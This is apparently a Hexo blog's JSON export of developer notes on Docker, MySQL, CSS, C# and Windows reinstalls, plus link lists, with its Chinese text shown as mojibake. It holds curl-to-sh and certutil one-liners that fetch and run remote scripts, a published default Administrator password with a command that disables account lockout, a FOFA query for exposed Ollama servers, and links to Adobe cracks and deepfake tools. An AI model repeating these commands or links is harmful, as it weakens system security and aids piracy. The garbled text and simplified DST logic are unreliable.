å¯ä»¥è¾“å…¥docker imagesæŸ¥çœ‹ â€‹ 3.åˆ›å»ºmysqlæ•°æ®åº“ç®¡ç†è½¯ä»¶å®¹å™¨ 1docker run --name myadmin -d --link mysql-container:db -p 8880:80 phpmyadmin/phpmyadmin â€‹ å›åˆ°dockeræŸ¥çœ‹ä¸‹å®¹å™¨æ˜¯å¦åˆ›å»ºæˆåŠŸã€‚â€‹ å¤åˆ¶åœ°å€åˆ°æµè§ˆå™¨è®¿é—®ã€‚â€‹ â€‹ okok å”‰å“Ÿä¸é”™å“¦~ æ‰©å±•ï¼šubuntuç‰ˆæœ¬ 1docker run -d --name mysql-container -e TZ=UTC -p 30306:3306 -e MYSQL_ROOT_PASSWORD=xxxxxx ubuntu/mysql:8.0-22.04_beta https://hub.docker.com/r/ubuntu/mysql?uuid=D64B1F2A-A81A-4D2C-B66B-FCFAECE77EFE","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"}],"author":"mu"},{"title":"Hello World Hexo","slug":"hello-world","date":"2024-03-20T14:16:01.000Z","updated":"2024-08-29T14:30:28.000Z","comments":true,"path":"2024/03/20/hello-world/","permalink":"https://banjinmei.github.io/2024/03/20/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post123456789npm install hexo-cli -ghexo init blogcd blognpm installhexo server$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"}],"author":"mu"},{"title":"some code","slug":"Cloud","date":"2023-08-02T18:12:50.000Z","updated":"2025-03-16T17:47:23.144Z","comments":true,"path":"2023/08/03/Cloud/","permalink":"https://banjinmei.github.io/2023/08/03/Cloud/","excerpt":"","text":"other skillsserver test1curl https://raw.githubusercontent.com/zhanghanyun/backtrace/main/install.sh -sSf | sh è¦åˆ¤æ–­æ˜¯ä¸æ˜¯å¥—äº†cfè¦åˆ¤æ–­æ˜¯ä¸æ˜¯å¥—äº†cfï¼Œå¯ä»¥åœ¨ç½‘å€åé¢åŠ &#x2F;cdn-cgi&#x2F;trace æœ‰é¡µé¢å°±æ˜¯å¥—äº†cf ä¸Šé¢ä¹Ÿä¼šæ˜¾ç¤ºä½ è®¿é—®ç”¨çš„iphttps://chat.openai.com/cdn-cgi/trace cssimgå±…ä¸­imgæ ‡ç­¾åœ¨HTMLé¡µé¢ä¸­å±…ä¸­æ˜¾ç¤ºï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š â€Œä¸€ã€æ°´å¹³å±…ä¸­â€Œâ€Œä½¿ç”¨text-alignå±æ€§â€Œï¼š ç»™imgçš„çˆ¶å…ƒç´ è®¾ç½®text-align: center;ï¼Œè¿™æ ·imgæ ‡ç­¾å°±ä¼šç»§æ‰¿è¿™ä¸ªå±æ€§ï¼Œå®ç°æ°´å¹³å±…ä¸­çš„æ•ˆæœâ€Œ12ã€‚â€Œä½¿ç”¨marginå±æ€§â€Œï¼š ç»™imgæ ‡ç­¾è®¾ç½®margin-left: auto;å’Œmargin-right: auto;ï¼Œå¹¶æ·»åŠ display: block;ï¼Œè¿™æ ·imgæ ‡ç­¾å°±ä¼šè‡ªåŠ¨è®¡ç®—å·¦å³ä¸¤è¾¹çš„ç©ºé—´ï¼Œä½¿å¾—å®ƒåœ¨æ°´å¹³æ–¹å‘ä¸Šå±…ä¸­â€Œ12ã€‚â€Œä½¿ç”¨flexå¸ƒå±€â€Œï¼š ç»™imgçš„çˆ¶å…ƒç´ è®¾ç½®display: flex;å’Œjustify-content: center;ï¼Œè¿™æ ·imgæ ‡ç­¾å°±ä¼šåœ¨çˆ¶å…ƒç´ çš„æ°´å¹³æ–¹å‘ä¸Šå±…ä¸­â€Œ12ã€‚ â€ŒäºŒã€å‚ç›´å±…ä¸­â€Œâ€Œä½¿ç”¨flexå¸ƒå±€â€Œï¼š ç»™åŒ…è£¹imgçš„çˆ¶å…ƒç´ è®¾ç½®**display: flex;å’Œalign-items: center;**ï¼Œå³å¯å®ç°å‚ç›´å±…ä¸­â€Œ45ã€‚â€Œä½¿ç”¨display: table;â€Œï¼š ç»™çˆ¶å…ƒç´ è®¾ç½®display: table;ï¼Œç»™å­å…ƒç´ ï¼ˆå³åŒ…è£¹imgçš„å®¹å™¨ï¼‰è®¾ç½®display: table-cell;å’Œvertical-align: middle;ï¼Œå³å¯å®ç°å‚ç›´å±…ä¸­â€Œ4ã€‚â€Œä½¿ç”¨ç»å¯¹å®šä½â€Œï¼š é€šè¿‡ç»å¯¹å®šä½çš„æ–¹å¼ï¼Œç»“åˆtopã€leftã€transformç­‰å±æ€§ï¼Œä¹Ÿå¯ä»¥å®ç°imgçš„å‚ç›´å±…ä¸­ï¼Œä½†è¿™ç§æ–¹æ³•éœ€è¦æ›´ç²¾ç»†çš„å¸ƒå±€æ§åˆ¶â€Œ4ã€‚æ ¹æ®å®é™…éœ€æ±‚ï¼Œå¯ä»¥é€‰æ‹©é€‚åˆçš„æ–¹æ³•æ¥å®ç°imgæ ‡ç­¾çš„å±…ä¸­æ˜¾ç¤ºã€‚ c# csharpswagger hideä½¿ç”¨ [ApiExplorerSettings] ç‰¹æ€§åœ¨æ¥å£æ–¹æ³•ä¸Šæ·»åŠ  [ApiExplorerSettings(IgnoreApi &#x3D; true)] ç‰¹æ€§ï¼Œè¿™ä¼šè®© Swagger å¿½ç•¥è¯¥æ¥å£ï¼Œä½†æ¥å£ä»ç„¶å¯ä»¥è¢«æ­£å¸¸è®¿é—®ã€‚ [HttpGet(â€œhiddenâ€)] åˆ™å®Œå…¨å»æ‰ c# email regex æ­£åˆ™æ ¡éªŒ12345678string pattern = @&quot;^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$&quot;;Regex regex = new Regex(pattern);if (!regex.IsMatch(email))&#123; trsm.msg = localizer.GetString(&quot;UStatus2&quot;).Value;//s2 jsrs = JsonConvert.SerializeObject(trsm); return jsrs;&#125; jsjs world time123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Time Zones Display&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; &#125; div &#123; margin-bottom: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;åŒ—äº¬æ—¶é—´: &lt;span id=&quot;beijingTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;ä¸œäº¬æ—¶é—´: &lt;span id=&quot;tokyoTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;æ¬§æ´²-å·´é»æ—¶é—´: &lt;span id=&quot;parisTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;è‹±å›½-ä¼¦æ•¦æ—¶é—´: &lt;span id=&quot;londonTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;ç¾ä¸œ-çº½çº¦æ—¶é—´: &lt;span id=&quot;newYorkTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;ç¾è¥¿-æ´›æ‰çŸ¶æ—¶é—´: &lt;span id=&quot;losAngelesTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;div&gt;UTCæ—¶é—´: &lt;span id=&quot;utcTime&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; // å®šä¹‰å„ä¸ªæ—¶åŒºç›¸å¯¹UTCçš„åç§»é‡ï¼ˆå•ä½ï¼šå°æ—¶ï¼‰ï¼Œè€ƒè™‘å¤ä»¤æ—¶æƒ…å†µè®¾ç½®ä¸åŒåç§»é‡èŒƒå›´ const timeZoneOffsets = &#123; &#x27;beijing&#x27;: 8, // åŒ—äº¬ä¸å®è¡Œå¤ä»¤æ—¶ï¼Œå›ºå®šåç§»8å°æ—¶ &#x27;tokyo&#x27;: 9, // ä¸œäº¬ä¸å®è¡Œå¤ä»¤æ—¶ï¼Œå›ºå®šåç§»9å°æ—¶ &#x27;paris&#x27;: [1, 2], // å·´é»å®è¡Œå¤ä»¤æ—¶ï¼Œå†¬ä»¤æ—¶åç§»1å°æ—¶ï¼Œå¤ä»¤æ—¶åç§»2å°æ—¶ï¼ˆç¤ºä¾‹ç®€åŒ–å¤„ç†ï¼Œå®é™…æ›´å¤æ‚ï¼‰ &#x27;london&#x27;: [0, 1], // ä¼¦æ•¦å®è¡Œå¤ä»¤æ—¶ï¼Œå†¬ä»¤æ—¶åç§»0å°æ—¶ï¼Œå¤ä»¤æ—¶åç§»1å°æ—¶ &#x27;newYork&#x27;: [-5, -4], // çº½çº¦å®è¡Œå¤ä»¤æ—¶ï¼Œå†¬ä»¤æ—¶åç§»-5å°æ—¶ï¼Œå¤ä»¤æ—¶åç§»-4å°æ—¶ &#x27;losAngeles&#x27;: [-8, -7] // æ´›æ‰çŸ¶å®è¡Œå¤ä»¤æ—¶ï¼Œå†¬ä»¤æ—¶åç§»-8å°æ—¶ï¼Œå¤ä»¤æ—¶åç§»-7å°æ—¶ &#125;; function padZero(num) &#123; return num &lt; 10? &#x27;0&#x27; + num : num; &#125; function formatTime(date) &#123; const year = date.getFullYear(); const month = padZero(date.getMonth() + 1); const day = padZero(date.getDate()); const hours = padZero(date.getHours()); const minutes = padZero(date.getMinutes()); const seconds = padZero(date.getSeconds()); return `$&#123;year&#125;-$&#123;month&#125;-$&#123;day&#125; $&#123;hours&#125;:$&#123;minutes&#125;:$&#123;seconds&#125;`; &#125; function isDaylightSavingTime(date, zone) &#123; const month = date.getMonth(); const dstStart = new Date(date.getFullYear(), 3, 8, 2, 0, 0); // å‡è®¾æ¯å¹´4æœˆ8æ—¥å‡Œæ™¨2ç‚¹å¼€å§‹å¤ä»¤æ—¶ï¼ˆç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…ä¸åŒåœ°åŒºè§„åˆ™å·®å¼‚å¤§ï¼‰ const dstEnd = new Date(date.getFullYear(), 10, 1, 2, 0, 0); // å‡è®¾æ¯å¹´10æœˆ1æ—¥å‡Œæ™¨2ç‚¹ç»“æŸå¤ä»¤æ—¶ if (zone === &#x27;paris&#x27; || zone === &#x27;london&#x27; || zone === &#x27;newYork&#x27; || zone === &#x27;losAngeles&#x27;) &#123; return date &gt;= dstStart &amp;&amp; date &lt; dstEnd; &#125; return false; &#125; function updateTime() &#123; const now = new Date(); const utcDate = new Date(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), now.getUTCHours(), now.getUTCMinutes(), now.getUTCSeconds()); const utcTime = formatTime(utcDate); document.getElementById(&#x27;utcTime&#x27;).innerHTML = utcTime; for (const zone in timeZoneOffsets) &#123; const offsets = timeZoneOffsets[zone]; let offset; if (Array.isArray(offsets)) &#123; offset = isDaylightSavingTime(utcDate, zone)? offsets[1] : offsets[0]; &#125; else &#123; offset = offsets; &#125; const zoneDate = new Date(utcDate.getTime() + offset * 60 * 60 * 1000); document.getElementById(zone + &#x27;Time&#x27;).innerHTML = formatTime(zoneDate); &#125; setTimeout(updateTime, 1000); &#125; window.onload = function () &#123; updateTime(); &#125;; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; .netiis err CS0016error CS0016: æœªèƒ½å†™å…¥è¾“å‡ºæ–‡ä»¶â€œc:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\6b681329\\aee16571\\App_global.asax.zxufqisi.dllâ€â€“â€œæ‹’ç»è®¿é—®ã€‚ â€è§£å†³åŠæ³• å°†windows&#x2F;tempå±æ€§-å®‰å…¨-é«˜çº§ æ·»åŠ IIS_USERSç”¨æˆ·ï¼ŒåŒæ—¶ç¼–è¾‘æƒé™ä¸ºå®Œå…¨æ§åˆ¶(å†™å…¥å’Œç¼–è¾‘)å³å¯ã€‚ æ³¨æ„: è¦ç¡®ä¿æƒé™æ·»åŠ ä¸Šäº†ï¼Œwin7ä¸‹æœ‰å¯èƒ½ç³»ç»Ÿä¸ºå®‰å…¨ï¼Œä¼šè‡ªåŠ¨å–æ¶ˆä½ æ‰€åšçš„æƒé™è®¾ç½®ã€‚å…ˆç®¡ç†å‘˜å–å¾—æ‰€æœ‰æƒï¼Œç„¶ååœ¨æ·»åŠ ã€‚ CultureInfo(â€œhkâ€) æ— æ•ˆUseRequestLocalization é…ç½®äº† â€œhkâ€ï¼Œä½† .NET ä¸æ”¯æŒ hk ä½œä¸ºæœ‰æ•ˆçš„æ–‡åŒ–ä»£ç ï¼Œå¯¼è‡´ .resx èµ„æºæ–‡ä»¶æ— æ³•æ­£ç¡®åŠ è½½ã€‚éœ€è¦ä¿®æ”¹ hk ä¸º zh-HKã€‚ .NET ä¸æ”¯æŒ new CultureInfo(â€œhkâ€)ï¼Œå®ƒä¸æ˜¯æ ‡å‡†çš„ .NET æ–‡åŒ–ä»£ç ã€‚ ğŸ”´ é”™è¯¯ç¤ºä¾‹ 1new CultureInfo(&quot;hk&quot;) // âŒ hk ä¸æ˜¯ .NET æ–‡åŒ–ä»£ç  âœ”ï¸ æ­£ç¡®ç¤ºä¾‹ 1new CultureInfo(&quot;zh-HK&quot;) // âœ… zh-HK æ˜¯æ­£ç¡®çš„æ–‡åŒ–ä»£ç  å½“å‰çš„ supportedCultures é‡Œ hk æ˜¯æ— æ•ˆçš„ï¼Œ.NET ä¸ä¼šè§£æ SharedResource.zh-HK.resxï¼Œå› æ­¤ localizer.GetString(â€œUStatus2pâ€) åªè¿”å›é”®å UStatus2pã€‚ vsæ ¼å¼åŒ–Ctrl+K Ctrl+D mssqlbackup é™åˆ¶è®¿é—®SQLè¿˜åŸDBå±æ€§ é€‰é¡¹ çŠ¶æ€ é™åˆ¶è®¿é—® SINGLE 12345USE master;GOALTER DATABASE databasenameSET SINGLE_USERWITH ROLLBACK IMMEDIATE; backup 123ALTER DATABASE databasenameSET MULTI_USER;GO MULTI_USER mysqlNOW() å’Œ CURRENT_DATE() çš„åŒºåˆ« NOW() å’Œ CURRENT_DATE() çš„åŒºåˆ«1 è¿”å›å€¼ç±»å‹ä¸åŒï¼šNOW() è¿”å›çš„æ˜¯ DATETIME ç±»å‹ï¼ŒåŒ…å«æ—¥æœŸå’Œæ—¶é—´ï¼ˆç²¾ç¡®åˆ°ç§’ï¼‰ã€‚CURRENT_DATE() è¿”å›çš„æ˜¯ DATE ç±»å‹ï¼Œä»…åŒ…å«æ—¥æœŸéƒ¨åˆ†ï¼Œä¸åŒ…å«æ—¶é—´ã€‚2 ç²¾åº¦ä¸åŒï¼šNOW() çš„ç²¾åº¦æ›´é«˜ï¼Œé€‚åˆç”¨äºéœ€è¦ç²¾ç¡®æ—¶é—´æˆ³çš„åœºåˆã€‚CURRENT_DATE() åªæä¾›æ—¥æœŸç²¾åº¦ï¼Œé€‚åˆåœ¨ä»…å…³æ³¨æ—¥æœŸçš„åœºæ™¯ä¸‹ä½¿ç”¨ã€‚3 ä½¿ç”¨åœºæ™¯ä¸åŒï¼šåœ¨éœ€è¦å®Œæ•´æ—¶é—´æˆ³çš„åœºåˆï¼ˆå¦‚æ—¥å¿—è®°å½•ã€äº‹ä»¶è·Ÿè¸ªã€æ—¶é—´å·®è®¡ç®—ï¼‰ï¼ŒNOW() æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚åœ¨ä»…éœ€å…³æ³¨æ—¥æœŸçš„åœºåˆï¼ˆå¦‚ç”Ÿæ—¥ã€å‘å¸ƒæ—¥æœŸã€è´¦å•æ—¥æœŸï¼‰ï¼ŒCURRENT_DATE() æ›´åŠ åˆé€‚ã€‚4 æ—¶é—´è®¡ç®—å·®å¼‚ï¼šä½¿ç”¨ NOW() å¯ä»¥ç›´æ¥è¿›è¡Œæ—¶é—´å·®è®¡ç®—ï¼Œå› ä¸ºå®ƒåŒ…å«äº†æ—¶é—´éƒ¨åˆ†ã€‚ä½¿ç”¨ CURRENT_DATE() è¿›è¡Œæ—¶é—´è®¡ç®—æ—¶ï¼Œæ¯”è¾ƒçš„åªæ˜¯æ—¥æœŸéƒ¨åˆ†ï¼Œå› æ­¤åœ¨è®¡ç®—æ—¶ä¸è€ƒè™‘å…·ä½“æ—¶é—´ã€‚ datatime insertNOW() æ—¥æœŸæ—¶é—´datatimeCURRENT_TIMESTAMP æ—¥æœŸæ—¶é—´CURDATE() æ—¥æœŸ mysql ä¿®æ”¹ ç´¯å¢ iuserè¡¨ UserEMail ä¸º&#49;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109; ç´¯å¢ å¦‚&#x32;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109; &#x33;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#x6d; &#x34;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#109; æœ‰å¤šå°‘ç”¨æˆ·åˆ™è¯¥å¤šå°‘ä¸ªã€‚æ‰¹é‡ä¿®æ”¹ UserEMail æ€ä¹ˆå†™mysqlåœ¨ MySQL ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨å˜é‡ç»“åˆUPDATEè¯­å¥æ¥å®ç°è¿™ä¸ªæ‰¹é‡ä¿®æ”¹UserEMailå­—æ®µå€¼çš„éœ€æ±‚ã€‚å‡è®¾è¡¨åä¸ºiuserï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼šsqlâ€“ è®¾ç½®åˆå§‹å€¼ä¸º1SET @num :&#x3D; 1;â€“ æ›´æ–°è¡¨ä¸­çš„æ•°æ®UPDATE iuserSET UserEMail &#x3D; CONCAT(@num :&#x3D; @num + 1, â€˜@qq.comâ€™);ä»£ç è§£é‡Šï¼šSET @num :&#x3D; 1;ï¼šå®šä¹‰äº†ä¸€ä¸ªç”¨æˆ·å˜é‡@numï¼Œå¹¶åˆå§‹åŒ–ä¸º1ã€‚UPDATE iuser SET UserEMail &#x3D; CONCAT(@num :&#x3D; @num + 1, â€˜@qq.comâ€™);ï¼šåœ¨æ›´æ–°è¯­å¥ä¸­ï¼Œä½¿ç”¨CONCATå‡½æ•°æŠŠå˜é‡@numä¸æ–­è‡ªå¢çš„å€¼ä¸â€˜@qq.comâ€™æ‹¼æ¥èµ·æ¥ï¼Œå†èµ‹å€¼ç»™UserEMailå­—æ®µã€‚æ¯æ¬¡æ›´æ–°æ—¶ï¼Œ@numå˜é‡éƒ½ä¼šè‡ªåŠ¨åŠ  1ï¼Œä»è€Œè¾¾æˆä¾æ¬¡ç”Ÿæˆ&#49;&#x40;&#113;&#113;&#46;&#99;&#111;&#x6d;ã€&#x32;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#109; ç­‰é‚®ç®±åœ°å€çš„æ•ˆæœã€‚ debianæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—dmesg | tail -n 50 something gitchatboxhttps://github.com/Bin-Huang/chatboxDesktop Client App for AI Models&#x2F;LLMs (GPT, Claude, Gemini, Ollamaâ€¦) fofahttps://fofa.info/app&#x3D;â€Ollamaâ€ &amp;&amp; is_domain&#x3D;falsehttps://github.com/ollama/ollama/blob/main/docs/api.md pyvideotranshttps://github.com/jianchang512/pyvideotrans ChatTTShttps://github.com/2noise/ChatTTS coqui TTShttps://github.com/coqui-ai/TTS TTS gpt-sovitshttps://github.com/RVC-Boss/GPT-SoVITS mRemoteNGé›†æˆå¤šåè®®çš„è¿œç¨‹è¿æ¥ç®¡ç†å·¥å…·https://github.com/mRemoteNG/mRemoteNG SamWafé˜²ç«å¢™å¼€æºçš„è½»é‡çº§ Web åº”ç”¨é˜²ç«å¢™https://github.com/samwafgo/SamWaf AndEggs å®‰å“å½©è›‹https://github.com/hushenghao/AndroidEasterEggs Vue-ElPlus-Adminé€šç”¨Vueåå°https://github.com/zanjiahao/Vue-ElPlus-Admin ChatGPT&#x2F;GeminiA cross-platform ChatGPT&#x2F;Gemini UI (Web &#x2F; PWA &#x2F; Linux &#x2F; Win &#x2F; MacOS). ä¸€é”®æ‹¥æœ‰ä½ è‡ªå·±çš„è·¨å¹³å° ChatGPT&#x2F;Gemini åº”ç”¨https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web ScreenToGifallows you to record a selected area of your screen, edit and save it as a gif or video.https://github.com/NickeManarin/ScreenToGif awesome-dotnetA collection of awesome .NET core libraries, tools, frameworks and softwarehttps://github.com/thangchung/awesome-dotnet-core DotNetGuideé¢å‘.NETå¼€å‘è€…çš„å¼€æºæŠ€æœ¯ç¤¾åŒºhttps://github.com/YSGStudyHards/DotNetGuide isply åç¼–è¯‘ dll exehttps://github.com/isply WinSCPa popular free SFTP and FTP client for Windowshttps://github.com/winscp/winscp mediasoupCutting Edge WebRTC Video Conferencinghttps://github.com/versatica/mediasoup-demo protobuf-netProtocol Buffers library for idiomatic .NEThttps://github.com/protobuf-net/protobuf-net DotNettySocket An Easy Socket(TcpSocket,WebSocket,UdpSocket) Framework Based On DotNettyhttps://github.com/Coldairarrow/DotNettySocket YOLO11åŸºäºæ·±åº¦å­¦ä¹ å’Œè®¡ç®—æœºè§†è§‰é¢†åŸŸçš„å°–ç«¯æŠ€æœ¯https://docs.ultralytics.com/https://github.com/ultralytics/ultralyticshttps://github.com/angery/yolov11demo .NET CORE ä»£ç ç”Ÿæˆå™¨Webä¸­ä½¿ç”¨CodeFirstæ¨¡å¼ï¼Œ å®ä½“ ç”Ÿæˆå™¨ï¼ŒUIä»£ç  ç”Ÿæˆå™¨ï¼Œåœ¨çº¿å»ºè¡¨ï¼ŒPostgresSqlç”Ÿæˆå™¨ï¼Œè¾¾æ¢¦ç”Ÿæˆå™¨ï¼Œé‡‘ä»“ç”Ÿæˆå™¨MySqlç”Ÿæˆå™¨ï¼ŒSQLServereç”Ÿæˆå™¨ã€Oracleç”Ÿæˆå™¨ã€Sqliteç”Ÿæˆå™¨ã€å¯¼å‡ºæ–‡æ¡£ï¼Œæ¨¡ç‰ˆé…ç½®ï¼Œ WEBä»£ç ç”Ÿæˆå™¨ ï¼ŒAPIä»£ç ç”Ÿæˆå™¨https://github.com/DotNetNext/WebFirst å¼€æºnotehttps://gitee.com/cxasm/notepad-- å¤§å±æ•°æ®https://gitee.com/lvyeyou/DaShuJuZhiDaPingZhanShi hello-cangjiehttps://github.com/open-cangjie/hello-cangjie nginx-uihttps://github.com/0xJacky/nginx-ui weeklyhttps://github.com/Geekhyt/weeklyhttps://github.com/ruanyf/weeklyhttps://github.com/ljinkai/weekly Kscangoå¼€å‘çš„å…¨æ–¹ä½æ‰«æå™¨ï¼Œhttps://github.com/lcvvvv/kscan python3æºç 12306æŠ¢ç¥¨ï¼Œexcelæ“ä½œï¼Œjsonæ“ä½œï¼Œrequestæ“ä½œï¼Œzipæ“ä½œï¼Œä¸‹ç­å€’è®¡æ—¶ï¼Œä»é›¶å­¦Python-æ˜é‡‘æ´»åŠ¨ï¼Œå›¾çµæœºå™¨äººèŠå¤©ï¼Œå¤„ç†Excelæ•°æ®åŸè¡¨ä¿å­˜ï¼Œå¤„ç†Excelè¡¨æ ¼æ•°æ®ï¼Œå¾®ä¿¡ç‚¹èµåˆ·ç¥¨ï¼Œæ¶æé’“é±¼ç½‘ç«™ï¼ŒæŠ“å–IPåœ°å€ï¼Œæ‹¼æ¥è¡¨æ ¼å•è¡Œæ•°æ®ä¸ºå­—ç¬¦ä¸²ï¼Œçˆ¬å–Bossç›´è˜æ•°æ®ï¼Œç‹è€…è£è€€çš®è‚¤çˆ¬å›¾ï¼Œç™¾æ€å›¾ç‰‡è§†é¢‘ï¼Œçœå¸‚åŒºä¸‰çº§åœ°å€json-mysqlï¼Œçœå¸‚åŒºä¸‰çº§åœ°å€åº“ï¼Œçœå¸‚åŒºä¹¡æ‘äº”çº§åœ°å€åº“ï¼Œçœå¸‚åŒºé•‡å››çº§åœ°å€åº“ï¼Œè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“è¡¨å­—å…¸çš„markdownæ–‡æœ¬ï¼Œè‡ªåŠ¨ç™»é™†é‚®ç®±ï¼Œè‹±é›„è”ç›Ÿçš®è‚¤çˆ¬å›¾ï¼Œè´´å§-å†…æ¶µæ®µå­ï¼Œè·³æ¿æœºè¿æ¥mysqlï¼Œè¿œç¨‹æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶https://github.com/gxcuizy/Python Awesome LLMs In Chinaä¸­æ–‡å¤§æ¨¡å‹https://github.com/wgwang/awesome-LLMs-In-China Deep-Live-CamReal-time face swap and video deepfake with a single click and only a single image.https://github.com/hacksider/Deep-Live-Cam awesome-avaloniaA collection of interesting libraries and tools for Avalonia project.https://github.com/AvaloniaCommunity/awesome-avalonia Machine Learning for allhttps://github.com/microsoft/ML-For-Beginners SunnyUI.NETåŸºäº.NET Framework 4.0+ã€.NET6ã€.NET8ã€.NET9 æ¡†æ¶çš„ C# WinForm UIã€å¼€æºæ§ä»¶åº“ã€å·¥å…·ç±»åº“ã€æ‰©å±•ç±»åº“ã€å¤šé¡µé¢å¼€å‘æ¡†æ¶ã€‚https://gitee.com/yhuse/SunnyUI flutter-chatbothttps://github.com/fanenr/flutter-chatbot immobile https://github.com/DWHengr/linyu_mobilepc https://github.com/DWHengr/linyu-clientserver https://github.com/DWHengr/linyu-server lazy-captcha .NETéªŒè¯ç https://gitee.com/pojianbing/lazy-captcha éšå†™ jpg png add text filehttps://github.com/kingthy/imagemask somelinkwebtoolhttps://www.w3cschool.cn/tools winwinç³»ç»Ÿå±±å·²å‡ å­æœ¨ï¼š https://msdn.sjjzm.com/win11.htmlHelloWindowsï¼šhttps://hellowindows.cn/MSDNï¼šhttps://next.itellyou.cn/Original/https://www.microsoft.com/zh-cn/windows?r=1 çƒ­æ¦œhttps://rebang.today å›½å¤–çƒ­æ¦œä¸­æ–‡å¯¹https://www.buzzing.cc/ å¼€å‘æ–‡ç« æ¨èdaily.dev product hunt æ¯æ—¥æœ€ä½³äº§å“https://www.producthunt.com/ techurlhttps://techurls.com/ mac appè¿™ä¸ªæ˜¯å›½å†…macç ´è§£ Adobeç ´è§£https://macked.app/Adobe ä¸‹è½½ é…åˆmackeçš„adobe activation toolhttps://github.com/X1a0He/Adobe-Downloader DD WIN10DD WIN10 Linuxç¯å¢ƒéƒ¨ç½²ï¼š curl -O https://gitlab.com/bin456789/reinstall/-/raw/main/reinstall.sh || wget -O reinstall.sh $_ bash reinstall.sh dd â€“img https://www.xiecloud.cn/d/Share/DDSystem/Win10_22H2.vhd.gz Windowsç¯å¢ƒéƒ¨ç½²ï¼š certutil -urlcache -f -split https://gitlab.com/bin456789/reinstall/-/raw/main/reinstall.bat .\\reinstall.bat dd â€“img https://www.xiecloud.cn/d/Share/DDSystem/Win10_22H2.vhd.gz è´¦æˆ·ï¼šAdministratorå¯†ç ï¼šHostloc.com DDæˆåŠŸç³»ç»Ÿåè¯·æ‰‹åŠ¨åœ¨CMDè¿è¡Œï¼šnet accounts &#x2F;lockoutthreshold:0å¯ç¦ç”¨è´¦æˆ·é”å®šã€‚ æ”¾å‡å‡æ—¥https://holidays-calendar.net/calendar_zh_cn/china_zh_cn.html googleç¿»è¯‘æ–‡æ¡£https://translate.google.com/?hl=zh-cn&amp;sl=zh-CN&amp;tl=zh-TW&amp;op=docs aliyunç½‘ç»œæµ‹è¯•https://boce.aliyun.com/detect/dns ecsæµ‹è¯•è„šæœ¬ shhttps://github.com/spiritLHLS/ecs uç›˜å¯åŠ¨å°ç±³ç¬”è®°æœ¬ F12&#x2F;delå¾®æ˜Ÿç¬”è®°æœ¬ F8 appleæ’è¡Œhttps://apps.apple.com/hk/charts/iphone/top-free-appd/36 å·¥å…· vvvhttps://github.com/selierlin/Share-SSR-V2rayhttps://github.com/2dust/v2rayN ç‹è€…çš®è‚¤https://pvp.qq.com/web201605/wallpaper.shtml MP3 DLhttps://3g.gljlw.com/music/wy/ç½‘æ˜“äº‘ æœºé¢†ç½‘ä¸‹è½½MP3https://github.com/jitwxs/163MusicLyricshttp://www.qeecc.com/ search musichttp://www.xmsj.org/ éŸ³ä¹æœç´¢å™¨ - å¤šç«™åˆä¸€éŸ³ä¹æœç´¢,éŸ³ä¹ reddithttps://www.reddit.com/r/webdev/https://www.reddit.com/r/programming/https://www.reddit.com/r/devops/https://www.reddit.com/r/LocalLLaMA/ è´­ç‰©æŸ¥ä»·https://tool.manmanbuy.com/HistoryLowest.aspx somegameçº¢è­¦2å…±å’Œå›½https://modelgood.com/5944.html çº¢è­¦2å¯¹æˆ˜https://www.ra2ol.com/ 11gamehttps://war3.5211game.com/ kkhttps://www.kkdzpt.com/ uphttps://patch.ali213.net/showpatch/209293.html Test[iOS] åˆ‡æ¢æˆç¹ä½“ é»˜è®¤åˆ†ç»„åå­—æ˜¾ç¤ºä¸å¯¹ â€¢ åœ¨ iOS è®¾å¤‡ ä¸Šï¼Œåˆ‡æ¢åº”ç”¨è¯­è¨€ä¸º ç¹ä½“ä¸­æ–‡ 